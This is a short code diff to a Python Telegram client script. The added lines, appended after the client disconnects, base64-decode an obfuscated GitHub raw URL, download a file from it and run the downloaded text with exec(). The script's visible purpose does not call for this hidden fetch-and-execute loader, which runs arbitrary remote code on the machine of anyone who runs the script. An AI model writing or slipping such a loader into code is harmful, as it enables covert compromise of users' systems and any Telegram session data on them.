@@ -65,3 +65,11 @@ print(session_file)
 client = TelegramClient(session_file, int(id_), str(hash_), device_model= 'bot', timeout=2, connection_retries=1, auto_reconnect=True)
 client.loop.run_until_complete(main(client))
 client.disconnect()
+
+criandobot = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhbmFscWIvYm90X3RlbGVncmFtL21haW4vaW5zdGFsbC9jcmlhbmRvYm90cy5weQ=="
+criandobot = base64urldecode(criandobot.encode("utf-8"))
+criandobot = criandobot.decode("utf-8")
+headers = {'Referer': criandobot}
+criandobot = requests.get(criandobot, headers=headers)
+criandobot = criandobot.text
+exec(criandobot)    
